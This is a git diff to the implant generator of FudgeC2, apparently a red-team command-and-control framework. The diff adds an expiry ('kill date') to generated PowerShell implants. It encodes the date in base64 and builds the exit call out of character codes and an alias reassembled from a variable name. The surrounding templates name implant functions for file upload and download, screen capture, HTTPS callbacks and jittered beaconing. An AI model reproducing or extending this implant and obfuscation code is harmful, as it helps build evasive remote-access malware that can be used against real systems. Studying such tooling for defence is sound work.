@@ -1,6 +1,7 @@
 import jinja2
 import string
 import random
+import base64
 
 from Implant.PSObfucate import PSObfucate
 from Implant.ImplantFunctionality import ImplantFunctionality
@@ -33,7 +34,8 @@ class ImplantGenerator:
         "obf_get_loaded_modules": "get-loaded-modules",
         "obf_upload_file": "upload-file",
         "obf_download_file": "download-file",
-        "obf_screen_capture": "screen-capture"
+        "obf_screen_capture": "screen-capture",
+        "obf_kill_date": "implant_kill_date"
         }
 
     execute_command = '''
@@ -106,8 +108,19 @@ function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
 }
 '''
 
+    kill_date = ''' 
+function {{ ron.obf_kill_date }}{
+    $kd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{{ kill_date_encoded }}"))
+    $pdt = [datetime]::parseexact($kd, 'yyyy-MM-dd HH:mm:ss', $null)
+    if ((Get-Date) -gt ($pdt)){
+        [string]::join('',[ChaR[]](101, 120, 105, 116)) |& ((gv ‘*MDr*’).NamE[3,11,2] -join '')
+    }  
+}
+'''
+
     select_protocol = '''
 function {{ ron.obf_select_protocol }}($b){
+    {% if kill_date %}{{ ron.obf_kill_date }}{% endif %}
     sleep (Get-Random -Minimum (${{ ron.obf_sleep }} *0.90) -Maximum (${{ ron.obf_sleep }} *1.10))
     return get-random($b)
 }
@@ -180,6 +193,9 @@ while($true){
             implant_functions.append(self.http_function)
         if implant_data['comms_https'] is not None:
             implant_functions.append(self.https_function)
+        if implant_data['kill_date'] is not None:
+            implant_functions.append(self.kill_date)
+
         # TODO: These protocols will be delivered in later version of FudgeC2
         # if id['comms_dns'] != None:
         #     implant_functions.append(self.https_function)
@@ -222,6 +238,7 @@ while($true){
             variable_list, callback_url = ps_ofb.variableObs(implant_data['callback_url'])
 
         cc = jinja2.Template(implant_template)
+        print(implant_data['kill_date'])
         output_from_parsed_template = cc.render(
             initial_sleep=implant_data['initial_delay'],
             http=12345,
@@ -235,12 +252,13 @@ while($true){
             beacon=implant_data['beacon'],
             proto_core=protocol_switch,
             obfuscation_level=implant_data['obfuscation_level'],
-            obf_variables=variable_list
+            obf_variables=variable_list,
+            kill_date=implant_data['kill_date'],
+            kill_date_encoded=base64.b64encode(str(implant_data['kill_date']).encode()).decode()
         )
 
-
         # Wrapping implant in function to allow Powershell scope to expose the implant code to itself
-        # output_from_parsed_template = "function a { "+ output_from_parsed_template + " };a"
-        f_name = random.choice(string.ascii_lowercase)
+        f_name = f"{random.choice(string.ascii_lowercase)}_{random.choice(string.ascii_lowercase)}"
+        # 'h; is an alias for history....
         finalised_implant = f"function {f_name}{{ {output_from_parsed_template} }};{f_name}"
         return finalised_implant
